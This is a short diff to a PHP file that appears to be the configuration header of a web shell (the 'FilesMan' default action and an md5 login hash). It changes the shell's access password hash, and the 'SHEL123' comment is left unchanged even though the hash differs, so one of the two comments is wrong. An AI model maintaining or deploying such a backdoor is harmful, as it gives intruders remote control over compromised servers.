@@ -11,7 +11,7 @@ session_start();
 
 /* Configuration */
 /* Password using md5 hashes */
-$password = "4647d00cf81f8fb0ab80f753320d0fc9"; //SHEL123
+$password = "09b60c39dbfb7319dec7f13c9c04f129"; //SHEL123
 $default_action = "FilesMan";
 $default_use_ajax = true;
 $default_charset = 'UTF-8';
